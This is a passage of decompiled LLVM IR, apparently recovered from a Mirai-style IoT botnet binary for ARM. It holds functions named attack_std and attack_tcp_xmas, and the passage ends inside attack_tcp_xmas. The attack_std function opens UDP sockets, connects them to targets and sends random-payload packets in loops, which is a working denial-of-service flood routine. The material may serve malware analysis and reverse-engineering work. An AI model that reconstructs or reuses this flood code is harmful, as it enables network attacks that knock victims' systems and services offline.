  store i32 %v5_9554, i32* %r2.global-to-local, align 4
  %v1_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9558, %v5_9548
  store i32 %v2_9558, i32* %r1.global-to-local, align 4
  %v1_955c = and i32 %v0_954c, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_9558, 20
  %v2_9560 = inttoptr i32 %v1_9560 to i8*
  %v3_9560 = load i8, i8* %v2_9560, align 1
  %v4_9560 = zext i8 %v3_9560 to i32
  store i32 %v4_9560, i32* %ip.global-to-local, align 4
  %v4_9564 = mul i32 %v1_955c, 256
  %v4_9568 = mul i32 %v0_954c, 16777216
  %v5_9564 = or i32 %v4_9564, %v4_9568
  %v5_9568 = or i32 %v5_9564, %v5_9554
  %v7_956c = lshr i32 %v0_953c, %v4_9560
  %v8_956c = add i32 %v7_956c, %v5_9568
  store i32 %v8_956c, i32* %r2.global-to-local, align 4
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  %v5_9588 = call i32 @llvm.bswap.i32(i32 %v8_956c)
  store i32 %v5_9588, i32* %r3.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  %v1_9590 = load i32, i32* @r5, align 4
  %v2_9590 = add i32 %v1_9590, 16
  %v3_9590 = inttoptr i32 %v2_9590 to i32*
  store i32 %v5_9588, i32* %v3_9590, align 4
  br i1 %v2_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9598:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  %v0_9598 = call i32 @rand_next()
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r4.global-to-local, align 4
  %v0_95a4 = load i32, i32* @fp, align 4
  %v9_95a4 = icmp eq i32 %v0_95a4, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_95a4, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = load i32, i32* @r5, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v0_9598, i32* %v3_95a8, align 4
  br i1 %v9_95a4, label %dec_label_pc_95b0, label %dec_label_pc_9598.dec_label_pc_9454_crit_edge

dec_label_pc_9598.dec_label_pc_9454_crit_edge:    ; preds = %dec_label_pc_9598
  %v1_9458.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9454

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9444
  %v0_95b0 = call i32 @rand_next()
  %v3_95b8 = urem i32 %v0_95b0, 65536
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v1_95c4 = sub nsw i32 999, %v3_95b8
  store i32 %v1_95c4, i32* %r3.global-to-local, align 4
  %v1_95c8 = load i32, i32* %r4.global-to-local, align 4
  %v9_95c8 = icmp eq i32 %v3_91dc, %v1_95c8
  store i1 %v9_95c8, i1* %cpsr_z.global-to-local, align 1
  %v1_95cc = trunc i32 %v0_95b0 to i16
  %v2_95cc = load i32, i32* @r5, align 4
  %v3_95cc = add i32 %v2_95cc, 4
  %v4_95cc = inttoptr i32 %v3_95cc to i16*
  store i16 %v1_95cc, i16* %v4_95cc, align 2
  %v0_95d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i16
  %v2_95d0 = load i32, i32* @r6, align 4
  %v3_95d0 = add i32 %v2_95d0, 4
  %v4_95d0 = inttoptr i32 %v3_95d0 to i16*
  store i16 %v1_95d0, i16* %v4_95d0, align 2
  br i1 %v9_95c8, label %dec_label_pc_95d8, label %dec_label_pc_95b0.dec_label_pc_9460_crit_edge

dec_label_pc_95b0.dec_label_pc_9460_crit_edge:    ; preds = %dec_label_pc_95b0
  %v1_9464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9460

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_9454
  %v0_95d8 = call i32 @rand_next()
  %v1_95d8 = trunc i32 %v0_95d8 to i16
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v1_95e0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95e0 = icmp eq i32 %v3_91e0, %v1_95e0
  store i1 %v9_95e0, i1* %cpsr_z.global-to-local, align 1
  %v3_95e4 = load i32, i32* @r5, align 4
  %v4_95e4 = add i32 %v3_95e4, 44
  %v5_95e4 = inttoptr i32 %v4_95e4 to i16*
  store i16 %v1_95d8, i16* %v5_95e4, align 2
  br i1 %v9_95e0, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  %v0_95ec = call i32 @rand_next()
  %v1_95ec = trunc i32 %v0_95ec to i16
  store i32 %v1_91d4, i32* %r4.global-to-local, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %.thread30, label %bb83

.thread30:                                        ; preds = %dec_label_pc_95ec
  %v3_95fc31 = load i32, i32* @r7, align 4
  %v4_95fc32 = add i32 %v3_95fc31, 2
  %v5_95fc33 = inttoptr i32 %v4_95fc32 to i16*
  store i16 %v1_95ec, i16* %v5_95fc33, align 2
  br label %dec_label_pc_9608

bb83:                                             ; preds = %dec_label_pc_95ec
  %v1_95f8 = load i32, i32* @r5, align 4
  %v2_95f8 = add i32 %v1_95f8, 16
  %v3_95f8 = inttoptr i32 %v2_95f8 to i32*
  %v4_95f8 = load i32, i32* %v3_95f8, align 4
  store i32 %v4_95f8, i32* %r3.global-to-local, align 4
  %v3_95fc = load i32, i32* @r7, align 4
  %v4_95fc = add i32 %v3_95fc, 2
  %v5_95fc = inttoptr i32 %v4_95fc to i16*
  store i16 %v1_95ec, i16* %v5_95fc, align 2
  %v1_9600 = load i32, i32* %r3.global-to-local, align 4
  %v2_9600 = load i32, i32* @r6, align 4
  %v3_9600 = add i32 %v2_9600, 16
  %v4_9600 = inttoptr i32 %v3_9600 to i32*
  store i32 %v1_9600, i32* %v4_9600, align 4
  br label %dec_label_pc_9480

dec_label_pc_9608:                                ; preds = %.thread30, %dec_label_pc_946c
  %v0_9608 = call i32 @rand_next()
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  %v1_9614 = load i32, i32* @r6, align 4
  %v2_9614 = add i32 %v1_9614, 16
  %v3_9614 = inttoptr i32 %v2_9614 to i32*
  store i32 %v0_9608, i32* %v3_9614, align 4
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_961c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608
  %v0_961c = load i32, i32* @r7, align 4
  %v1_961c = add i32 %v0_961c, 8
  store i32 %v1_961c, i32* @r0, align 4
  store i32 %v6_9128, i32* %r1.global-to-local, align 4
  %v2_9624 = call i32 @rand_str(i32 %v1_961c, i32 %v6_9128)
  br label %dec_label_pc_948c

dec_label_pc_962c:                                ; preds = %dec_label_pc_91a0
  %v1_9630 = call i32 @__GI___libc_close(i32 %v3_9190)
  br label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_962c
  %v1_963c = phi i32 [ %v3_9190, %entry ], [ %v1_9630, %dec_label_pc_962c ]
  store i32 %v3_9040, i32* %r4.global-to-local, align 4
  store i32 %v6_9040, i32* %r5.global-to-local, align 4
  store i32 %v24_9040, i32* %fp.global-to-local, align 4
  ret i32 %v1_963c

dec_label_pc_9640:                                ; preds = %dec_label_pc_91c8
  store i32 %v6_9128, i32* %r2.global-to-local, align 4
  %v1_9648 = add i32 %v6_9128, 8
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93fc.preheader

; uselistorder directives
  uselistorder i32 %v1_9648, { 1, 0 }
  uselistorder i16 %v1_95ec, { 1, 0 }
  uselistorder i32 %v0_95b0, { 1, 0 }
  uselistorder i32 %v5_9588, { 1, 0 }
  uselistorder i32 %v0_954c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9528, { 1, 2, 0 }
  uselistorder i32 %v1_9524, { 2, 0, 3, 1 }
  uselistorder i32 %v3_94d8, { 1, 0, 2 }
  uselistorder i32 %v0_94c0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9424, { 1, 0, 2 }
  uselistorder i1 %v7_943c, { 2, 1, 0 }
  uselistorder i1 %v2_9610, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9398, { 1, 0 }
  uselistorder i32 %v4_930c13, { 1, 0 }
  uselistorder i32 %v3_9230, { 1, 0 }
  uselistorder i32 %v3_9214, { 1, 2, 0 }
  uselistorder i32 %v1_9210, { 1, 0 }
  uselistorder i32 %v1_91d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_91d0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_91cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_91c8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_91c0, { 1, 0 }
  uselistorder i1 %v7_9194, { 1, 0 }
  uselistorder i32 %v3_9190, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_917c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9148, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9128, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_90dc, { 1, 2, 0 }
  uselistorder i32 %v1_90b8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_90b0, { 1, 0 }
  uselistorder i32 %v6_9074, { 2, 1, 3, 0 }
  uselistorder i32 %v2_905c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 8, 7, 9, 2, 3, 4, 5, 6, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93fc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_965c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9678 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_9678, i32* @sl, align 4
  %v0_9684 = load i32, i32* @r7, align 4
  %v2_9688 = call i32 @calloc(i32 %v0_9684, i32 4)
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  %v0_9694 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_9688, i32* @r8, align 4
  %v0_96a4 = load i32, i32* @r5, align 4
  %v6_96a8 = inttoptr i32 %v0_9694 to i32*
  %v7_96a8 = call i32 @attack_get_opt_int(i32 %v0_96a4, i32* %v6_96a8, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_96b0 = urem i32 %v7_96a8, 65536
  %v0_96b4 = load i32, i32* @r6, align 4
  %v0_96bc = load i32, i32* @r4, align 4
  store i32 %v0_96bc, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %sext = mul i32 %v0_96bc, 65536
  %v4_96c8 = sdiv i32 %sext, 65536
  %v6_96c8 = inttoptr i32 %v0_96b4 to i32*
  %v7_96c8 = call i32 @attack_get_opt_int(i32 %v0_96c0, i32* %v6_96c8, i32 6, i32 %v4_96c8, i32 %v3_96b0)
  %v0_96cc = load i32, i32* @r6, align 4
  %v3_96d0 = mul i32 %v7_96c8, 65536
  store i32 %v3_96d0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v5_96e0 = inttoptr i32 %v0_96cc to i32*
  %v6_96e0 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r6, align 4
  %v0_96f4 = load i32, i32* @r5, align 4
  %v3_96f8 = urem i32 %v6_96e0, 65536
  store i32 %v3_96f8, i32* @r5, align 4
  %v5_96fc = inttoptr i32 %v0_96f0 to i32*
  %v6_96fc = call i32 @attack_get_opt_int(i32 %v0_96f4, i32* %v5_96fc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_9700 = load i32, i32* %sb.global-to-local, align 4
  %v3_9700 = udiv i32 %v0_9700, 65536
  store i32 %v3_9700, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9708 = load i32, i32* @r4, align 4
  %v9_9708 = icmp eq i32 %v3_9700, %v1_9708
  br i1 %v9_9708, label %dec_label_pc_9738, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_9720 = udiv i32 %v0_9700, 16777216
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9748

dec_label_pc_9738:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_9738 = call i32 @rand_next()
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %bb, %dec_label_pc_9738
  %v0_972c10 = urem i32 %v6_96fc, 256
  %v0_9748 = load i32, i32* @r7, align 4
  %v2_9748 = icmp eq i32 %v0_9748, 0
  br i1 %v2_9748, label %dec_label_pc_9888, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9748
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97fc = udiv i32 %v3_96b0, 256
  %v1_97f8 = mul i32 %v7_96a8, 256
  %v4_9800 = and i32 %v1_97f8, 65280
  %v5_9800 = or i32 %v4_9800, %v3_97fc
  %v2_9780 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97e0

dec_label_pc_9760:                                ; preds = %bb51, %dec_label_pc_9820
  %v3_976c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_9774 = icmp eq i32 %v3_976c, -1
  %v0_9778 = load i32, i32* @sb, align 4
  %v1_9778 = add i32 %v0_9778, 1
  store i32 %v1_9778, i32* @sb, align 4
  %v0_977c = load i32, i32* @fp, align 4
  %v1_977c = add i32 %v0_977c, 24
  store i32 %v1_977c, i32* @fp, align 4
  %v2_9788 = load i32, i32* @r8, align 4
  %v3_9788 = add i32 %v2_9788, %stack_var_-60.0
  %v4_9788 = inttoptr i32 %v3_9788 to i32*
  store i32 %v3_976c, i32* %v4_9788, align 4
  br i1 %v7_9774, label %dec_label_pc_987c, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9760
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_97a8 = call i32 @bind(i32 %v3_976c, i32 %v2_9780, i32 16)
  %v0_97ac = load i32, i32* @r6, align 4
  %v1_97ac = add i32 %v0_97ac, 20
  %v2_97ac = inttoptr i32 %v1_97ac to i8*
  %v3_97ac = load i8, i8* %v2_97ac, align 1
  %v4_97ac = zext i8 %v3_97ac to i32
  store i32 %v4_97ac, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_97ac, 32
  br i1 %tmp, label %dec_label_pc_9834, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9834
  %v0_97bc = phi i32 [ %v0_97ac, %dec_label_pc_9790 ], [ %v0_97bc.pre, %dec_label_pc_9834 ]
  %v1_97c0 = load i32, i32* @r8, align 4
  %v2_97c0 = add i32 %v1_97c0, %stack_var_-60.0
  %v3_97c0 = inttoptr i32 %v2_97c0 to i32*
  %v4_97c0 = load i32, i32* %v3_97c0, align 4
  %v3_97c8 = call i32 @__libc_connect(i32 %v4_97c0, i32 %v0_97bc, i32 16)
  %v0_97d0 = load i32, i32* @sb, align 4
  %v1_97d0 = load i32, i32* @r7, align 4
  %v9_97d0 = icmp eq i32 %v0_97d0, %v1_97d0
  %v1_97d4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  br i1 %v9_97d0, label %dec_label_pc_9888, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9750
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9750 ], [ %v1_97d4, %dec_label_pc_97b8 ]
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  %v3_97f0 = call i32 @calloc(i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 1)
  store i32 %v5_9800, i32* %r3.global-to-local, align 4
  %v1_980c = load i32, i32* @r4, align 4
  %v9_980c = icmp eq i32 %v3_96b0, %v1_980c
  %v1_9810 = load i32, i32* @fp, align 4
  %v2_9810 = add i32 %v1_9810, %arg2
  store i32 %v2_9810, i32* @r6, align 4
  %v2_9814 = load i32, i32* @sl, align 4
  %v3_9814 = add i32 %v2_9814, %stack_var_-60.0
  %v4_9814 = inttoptr i32 %v3_9814 to i32*
  store i32 %v3_97f0, i32* %v4_9814, align 4
  br i1 %v9_980c, label %dec_label_pc_9820, label %bb51

bb51:                                             ; preds = %dec_label_pc_97e0
  %v1_9818 = load i32, i32* %r3.global-to-local, align 4
  %v2_9818 = trunc i32 %v1_9818 to i16
  %v3_9818 = load i32, i32* @r6, align 4
  %v4_9818 = add i32 %v3_9818, 2
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v2_9818, i16* %v5_9818, align 2
  br label %dec_label_pc_9760

dec_label_pc_9820:                                ; preds = %dec_label_pc_97e0
  %v0_9820 = call i32 @rand_next()
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v0_9828 = load i32, i32* @fp, align 4
  %v2_9828 = add i32 %v0_9828, %arg2
  store i32 %v2_9828, i32* @r6, align 4
  %v4_982c = add i32 %v2_9828, 2
  %v5_982c = inttoptr i32 %v4_982c to i16*
  store i16 %v1_9820, i16* %v5_982c, align 2
  br label %dec_label_pc_9760

dec_label_pc_9834:                                ; preds = %dec_label_pc_9790
  %v1_9834 = add i32 %v0_97ac, 16
  %v2_9834 = inttoptr i32 %v1_9834 to i32*
  %v3_9834 = load i32, i32* %v2_9834, align 4
  store i32 %v3_9834, i32* @r4, align 4
  %v0_9838 = call i32 @rand_next()
  %v0_983c = load i32, i32* @r4, align 4
  %v1_983c = and i32 %v0_983c, 16711680
  %v3_9840 = udiv i32 %v0_983c, 16777216
  %v4_9844 = udiv i32 %v1_983c, 256
  %v5_9844 = or i32 %v4_9844, %v3_9840
  %v1_9848 = and i32 %v0_983c, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_9848, i32* %r3.global-to-local, align 4
  %v4_984c = mul i32 %v1_9848, 256
  %v5_984c = or i32 %v5_9844, %v4_984c
  %v0_9850 = load i32, i32* @r6, align 4
  %v1_9850 = add i32 %v0_9850, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  %v4_9854 = mul i32 %v0_983c, 16777216
  %v5_9854 = or i32 %v5_984c, %v4_9854
  %v7_9858 = lshr i32 %v0_9838, %v4_9850
  %v8_9858 = add i32 %v7_9858, %v5_9854
  %v5_9870 = call i32 @llvm.bswap.i32(i32 %v8_9858)
  store i32 %v5_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = add i32 %v0_9850, 4
  %v3_9874 = inttoptr i32 %v2_9874 to i32*
  store i32 %v5_9870, i32* %v3_9874, align 4
  %v0_97bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97b8

dec_label_pc_987c:                                ; preds = %dec_label_pc_9760
  store i32 %v18_965c, i32* %sb.global-to-local, align 4
  ret i32 %v3_976c

dec_label_pc_9888:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9748
  %v1_98c822 = phi i32 [ 0, %dec_label_pc_9748 ], [ %v0_97d0, %dec_label_pc_97b8 ]
  %v2_988c = icmp eq i32 %v0_972c10, 0
  br i1 %v2_988c, label %dec_label_pc_98ac.outer, label %dec_label_pc_98c4

dec_label_pc_989c:                                ; preds = %dec_label_pc_98ac
  store i32 %v1_98a0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_989c = load i32, i32* @r8, align 4
  %v4_989c = mul i32 %v1_98a0, 4
  %v5_989c = add i32 %v0_989c, %v4_989c
  %v6_989c = inttoptr i32 %v5_989c to i32*
  %v7_989c = load i32, i32* %v6_989c, align 4
  %v0_98a0 = load i32, i32* @sl, align 4
  %v5_98a0 = add i32 %v0_98a0, %v4_989c
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v4_98a4 = call i32 @__libc_send(i32 %v7_989c, i32 %v7_98a0, i32 %v0_98b0, i32 16384)
  %v0_98a8 = load i32, i32* @r4, align 4
  %v1_98a8 = add i32 %v0_98a8, 1
  %v0_98ac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98ac.outer

dec_label_pc_98ac.outer:                          ; preds = %dec_label_pc_9888, %dec_label_pc_989c
  %v0_98ac.ph = phi i32 [ %v0_98ac.pre.pre, %dec_label_pc_989c ], [ %v1_98c822, %dec_label_pc_9888 ]
  %v1_98a0.ph = phi i32 [ %v1_98a8, %dec_label_pc_989c ], [ 0, %dec_label_pc_9888 ]
  %v0_98b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %dec_label_pc_98ac.outer, %dec_label_pc_98ac
  %v1_98a0 = phi i32 [ 0, %dec_label_pc_98ac ], [ %v1_98a0.ph, %dec_label_pc_98ac.outer ]
  %v8_98b8 = icmp sgt i32 %v0_98ac.ph, %v1_98a0
  br i1 %v8_98b8, label %dec_label_pc_989c, label %dec_label_pc_98ac

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c8, %dec_label_pc_9888
  %v1_98c821 = phi i32 [ %v1_98c822, %dec_label_pc_9888 ], [ %v1_98c8, %dec_label_pc_98c8 ]
  br label %dec_label_pc_98c8

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98c4
  %v1_98c8 = phi i32 [ %v1_98c821, %dec_label_pc_98c4 ], [ %v1_98c8.pre, %dec_label_pc_98d4 ]
  %v1_98d4 = phi i32 [ 0, %dec_label_pc_98c4 ], [ %v1_98f4, %dec_label_pc_98d4 ]
  store i32 %v1_98d4, i32* @r6, align 4
  %v6_98d0 = icmp slt i32 %v1_98d4, %v1_98c8
  br i1 %v6_98d0, label %dec_label_pc_98d4, label %dec_label_pc_98c4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98c8
  %v0_98cc = load i32, i32* @r5, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  %v4_98d4 = mul i32 %v1_98d4, 4
  %v5_98d4 = add i32 %v0_98d4, %v4_98d4
  %v6_98d4 = inttoptr i32 %v5_98d4 to i32*
  %v7_98d4 = load i32, i32* %v6_98d4, align 4
  store i32 %v7_98d4, i32* @r4, align 4
  store i32 %v7_98d4, i32* @r0, align 4
  %v2_98dc = call i32 @rand_str(i32 %v7_98d4, i32 %v0_98cc)
  %v0_98e0 = load i32, i32* @r8, align 4
  %v1_98e0 = load i32, i32* @r6, align 4
  %v4_98e0 = mul i32 %v1_98e0, 4
  %v5_98e0 = add i32 %v4_98e0, %v0_98e0
  %v6_98e0 = inttoptr i32 %v5_98e0 to i32*
  %v7_98e0 = load i32, i32* %v6_98e0, align 4
  %v0_98e4 = load i32, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98f0 = call i32 @__libc_send(i32 %v7_98e0, i32 %v0_98e4, i32 %v0_98e8, i32 16384)
  %v0_98f4 = load i32, i32* @r6, align 4
  %v1_98f4 = add i32 %v0_98f4, 1
  %v1_98c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98c8

; uselistorder directives
  uselistorder i32 %v1_98c8, { 1, 0 }
  uselistorder i32 %v1_98a0, { 2, 1, 0 }
  uselistorder i32 %v5_9870, { 1, 0 }
  uselistorder i32 %v0_983c, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97ac, { 1, 0, 2 }
  uselistorder i32 %v3_976c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_9700, { 1, 0 }
  uselistorder i32 %v3_96b0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_98ac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
}

define i32 @attack_tcp_xmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98fc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_9918 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_9924 = load i32, i32* @r6, align 4
  store i32 %v0_9924, i32* %r0.global-to-local, align 4
  %v2_9928 = call i32 @calloc(i32 %v0_9924, i32 4)
  %v0_992c = load i32, i32* @r5, align 4
  store i32 %v0_992c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_993c = load i32, i32* @r4, align 4
  store i32 %v0_993c, i32* %r0.global-to-local, align 4
  %v5_9940 = inttoptr i32 %v0_992c to i32*
  %v6_9940 = call i32 @attack_get_opt_int(i32 %v0_993c, i32* %v5_9940, i32 2, i32 0, i32 %v2_9928)
  %v1_994c = urem i32 %v6_9940, 256
  store i32 %v1_994c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9958 = load i32, i32* @r5, align 4
  store i32 %v0_9958, i32* %r1.global-to-local, align 4
  %v0_995c = load i32, i32* @r4, align 4
